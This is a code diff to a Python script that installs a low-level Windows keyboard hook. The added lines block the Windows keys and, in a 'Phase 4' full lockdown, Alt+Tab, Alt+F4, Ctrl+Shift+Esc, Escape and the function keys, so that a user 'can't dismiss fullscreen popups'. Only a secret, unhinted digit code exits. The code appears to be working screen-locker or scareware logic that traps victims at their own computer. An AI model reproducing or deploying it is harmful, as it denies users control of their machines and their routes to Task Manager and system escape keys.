@@ -45,24 +45,59 @@ class _KHS(ctypes.Structure):
 
 _HOOKP = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int,
                               ctypes.POINTER(_KHS))
-_buf = []
+_buf  = []
+_held = set()   # tracks currently-held vkCodes for combo detection
 
 def _kb(n, w, l):
     if n >= 0:
         v = l.contents.vkCode
-        # ── Block Windows key entirely (prevents Start, Win+L, Win+X, Win+D) ──
-        if v in (0x5B, 0x5C):          # LWin, RWin
-            return 1                    # swallow — never reaches OS
-        # ── Block Ctrl+Esc (alternate Start menu) ─────────────────────────────
-        if v == 0x1B:                   # ESC — block it in phase4
-            if _lockdown[0]:
+
+        # Track key-down / key-up state for combo detection
+        if w in (0x0100, 0x0104):   # WM_KEYDOWN / WM_SYSKEYDOWN
+            _held.add(v)
+        elif w in (0x0101, 0x0105): # WM_KEYUP   / WM_SYSKEYUP
+            _held.discard(v)
+
+        def _alt():  return bool(_held & {0x12, 0xA4, 0xA5})   # any Alt key
+        def _ctrl(): return bool(_held & {0x11, 0xA2, 0xA3})   # any Ctrl key
+        def _shift():return bool(_held & {0x10, 0xA0, 0xA1})   # any Shift key
+
+        # ── Always block: Windows keys (LWin / RWin) ─────────────────────────
+        # Blocks Start menu, Win+L lock, Win+X power menu, Win+D desktop, etc.
+        if v in (0x5B, 0x5C):
+            return 1
+
+        # ── In full lockdown (Phase 4): block task-switcher / manager combos ──
+        if _lockdown[0]:
+            # Alt+Tab  — task switcher
+            if v == 0x09 and _alt():
                 return 1
-        if w == 0x0100:                 # WM_KEYDOWN
-            if 0x30 <= v <= 0x39:
-                _buf.append(chr(v))
-                if len(_buf) > 4: _buf.pop(0)
-                if ''.join(_buf) == '4308':
-                    os._exit(0)         # secret exit — no hint in UI
+            # Alt+F4  — close window
+            if v == 0x73 and _alt():
+                return 1
+            # Alt+Esc — cycle windows without showing switcher
+            if v == 0x1B and _alt():
+                return 1
+            # Ctrl+Esc  — alternate Start menu
+            if v == 0x1B and _ctrl() and not _alt():
+                return 1
+            # Ctrl+Shift+Esc  — opens Task Manager directly
+            if v == 0x1B and _ctrl() and _shift():
+                return 1
+            # Escape alone — block so they can't dismiss fullscreen popups
+            if v == 0x1B and not _ctrl() and not _alt():
+                return 1
+            # F1-F12 block — prevents F5 refresh, F11 fullscreen tricks, etc.
+            if 0x70 <= v <= 0x7B and not (v == 0x73 and _alt()):  # keep Alt+F4 path above
+                return 1
+
+        # ── Secret 4-digit exit sequence: 4308 ──────────────────────────────
+        if w == 0x0100 and 0x30 <= v <= 0x39:
+            _buf.append(chr(v))
+            if len(_buf) > 4: _buf.pop(0)
+            if ''.join(_buf) == '4308':
+                os._exit(0)
+
     return user32.CallNextHookEx(None, n, w, l)
 
 _kbp = _HOOKP(_kb)
